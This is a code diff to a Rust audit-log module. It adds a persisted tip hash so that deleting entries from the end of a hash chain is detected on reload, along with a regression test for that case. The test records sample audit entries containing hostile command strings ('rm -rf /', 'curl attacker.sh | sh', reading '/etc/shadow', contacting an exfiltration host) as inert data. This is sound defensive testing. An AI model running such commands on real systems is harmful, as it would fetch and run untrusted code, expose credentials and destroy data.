@@ -6,6 +6,12 @@
 //!
 //! When a database connection is provided (`with_db`), entries are persisted to
 //! the `audit_entries` table (schema V8) so the trail survives daemon restarts.
+//!
+//! The current tip hash is additionally persisted to a single-row
+//! `audit_chain_state` table on every write. On load, the recomputed tip is
+//! compared against this stored tip, which detects tail-truncation: deleting
+//! entries from the end of the chain leaves the surviving links valid, so a
+//! forward-only walk cannot catch it, but the stored tip will no longer match.
 
 use chrono::Utc;
 use rusqlite::Connection;
@@ -109,9 +115,19 @@ impl AuditLog {
     pub fn with_db(conn: Arc<Mutex<Connection>>) -> Self {
         let mut entries = Vec::new();
         let mut tip = "0".repeat(64);
+        let mut stored_tip: Option<String> = None;
 
         // Load existing entries from database
         if let Ok(db) = conn.lock() {
+            // Ensure the single-row tip-tracking table exists.
+            let _ = db.execute(
+                "CREATE TABLE IF NOT EXISTS audit_chain_state (
+                    id INTEGER PRIMARY KEY CHECK (id = 1),
+                    tip_hash TEXT NOT NULL
+                )",
+                [],
+            );
+
             let result = db.prepare(
                 "SELECT seq, timestamp, agent_id, action, detail, outcome, prev_hash, hash FROM audit_entries ORDER BY seq ASC",
             );
@@ -151,12 +167,21 @@ impl AuditLog {
                     }
                 }
             }
+
+            // Read the persisted tip, if one was ever written.
+            stored_tip = db
+                .query_row(
+                    "SELECT tip_hash FROM audit_chain_state WHERE id = 1",
+                    [],
+                    |row| row.get::<_, String>(0),
+                )
+                .ok();
         }
 
         let count = entries.len();
         let log = Self {
             entries: Mutex::new(entries),
-            tip: Mutex::new(tip),
+            tip: Mutex::new(tip.clone()),
             db: Some(conn),
         };
 
@@ -166,6 +191,18 @@ impl AuditLog {
                 tracing::error!("Audit trail integrity check FAILED on boot: {e}");
             } else {
                 tracing::info!("Audit trail loaded: {count} entries, chain integrity OK");
+            }
+        }
+
+        // Truncation check: if a tip was previously persisted, the tip we
+        // recomputed by walking the loaded entries must match it. A mismatch
+        // means entries were deleted from the end (or otherwise altered) while
+        // the daemon was down — the forward-only walk above cannot see this.
+        if let Some(expected) = stored_tip {
+            if expected != tip {
+                tracing::error!(
+                    "Audit trail TRUNCATION detected on boot: stored tip {expected} does not match recomputed tip {tip}"
+                );
             }
         }
 
@@ -226,6 +263,14 @@ impl AuditLog {
                         &entry.hash,
                     ],
                 );
+
+                // Persist the advanced tip so tail-truncation is detectable on
+                // the next load.
+                let _ = conn.execute(
+                    "INSERT INTO audit_chain_state (id, tip_hash) VALUES (1, ?1)
+                     ON CONFLICT(id) DO UPDATE SET tip_hash = excluded.tip_hash",
+                    rusqlite::params![&hash],
+                );
             }
         }
 
@@ -238,6 +283,10 @@ impl AuditLog {
     ///
     /// Returns `Ok(())` if the chain is intact, or `Err(msg)` describing
     /// the first inconsistency found.
+    ///
+    /// Note: this walk detects modified or reordered entries, but not entries
+    /// deleted from the tail — for that, compare against the persisted tip via
+    /// [`AuditLog::verify_against_stored_tip`].
     pub fn verify_integrity(&self) -> Result<(), String> {
         let entries = self.entries.lock().unwrap_or_else(|e| e.into_inner());
         let mut expected_prev = "0".repeat(64);
@@ -271,6 +320,34 @@ impl AuditLog {
         }
 
         Ok(())
+    }
+
+    /// Compares the current in-memory tip against the tip persisted in the
+    /// database. Returns `Err` if they differ (tail-truncation or tip
+    /// tampering) or if no tip has ever been persisted while entries exist.
+    ///
+    /// Returns `Ok(())` for an in-memory-only log (no database).
+    pub fn verify_against_stored_tip(&self) -> Result<(), String> {
+        let db = match &self.db {
+            Some(db) => db,
+            None => return Ok(()),
+        };
+        let conn = db.lock().unwrap_or_else(|e| e.into_inner());
+        let stored: Option<String> = conn
+            .query_row(
+                "SELECT tip_hash FROM audit_chain_state WHERE id = 1",
+                [],
+                |row| row.get::<_, String>(0),
+            )
+            .ok();
+        let current = self.tip.lock().unwrap_or_else(|e| e.into_inner()).clone();
+
+        match stored {
+            Some(expected) if expected != current => Err(format!(
+                "stored tip {expected} does not match current tip {current} (possible truncation)"
+            )),
+            _ => Ok(()),
+        }
     }
 
     /// Returns the current tip hash (the hash of the most recent entry,
@@ -418,5 +495,62 @@ mod tests {
         // Verify tip is correct
         let entries = log2.recent(3);
         assert_eq!(entries[2].prev_hash, entries[1].hash);
+    }
+
+    #[test]
+    fn test_audit_truncation_is_detected() {
+        // Regression test for tail-truncation of the persisted audit chain.
+        // Deleting entries from the end leaves surviving links valid, so
+        // verify_integrity() (a forward-only walk) still passes. The persisted
+        // tip is what catches it: verify_against_stored_tip() must fail.
+        let conn = Connection::open_in_memory().unwrap();
+        conn.execute_batch(
+            "CREATE TABLE audit_entries (
+                seq INTEGER PRIMARY KEY,
+                timestamp TEXT NOT NULL,
+                agent_id TEXT NOT NULL,
+                action TEXT NOT NULL,
+                detail TEXT NOT NULL,
+                outcome TEXT NOT NULL,
+                prev_hash TEXT NOT NULL,
+                hash TEXT NOT NULL
+            )",
+        )
+        .unwrap();
+
+        let db = Arc::new(Mutex::new(conn));
+
+        // Record 5 entries.
+        let log = AuditLog::with_db(Arc::clone(&db));
+        log.record("agent-1", AuditAction::AgentSpawn, "spawn", "ok");
+        log.record("agent-1", AuditAction::ShellExec, "rm -rf /", "denied");
+        log.record("agent-1", AuditAction::NetworkAccess, "exfil.example.com", "ok");
+        log.record("agent-1", AuditAction::FileAccess, "/etc/shadow", "ok");
+        log.record("agent-1", AuditAction::ShellExec, "curl attacker.sh | sh", "ok");
+        assert_eq!(log.len(), 5);
+        assert!(log.verify_integrity().is_ok());
+        assert!(log.verify_against_stored_tip().is_ok());
+
+        // Attacker with DB write access deletes the last 2 rows to erase the
+        // most incriminating actions.
+        {
+            let c = db.lock().unwrap();
+            c.execute("DELETE FROM audit_entries WHERE seq >= 3", []).unwrap();
+        }
+
+        // Reload, as the daemon would on restart.
+        let log2 = AuditLog::with_db(Arc::clone(&db));
+
+        // The forward-only walk still passes — this is why it was missed.
+        assert_eq!(log2.len(), 3);
+        assert!(log2.verify_integrity().is_ok());
+
+        // But the stored-tip check now catches the truncation. This is the fix.
+        let result = log2.verify_against_stored_tip();
+        assert!(
+            result.is_err(),
+            "truncation must be detected via the persisted tip"
+        );
+        assert!(result.unwrap_err().contains("truncation"));
     }
 }
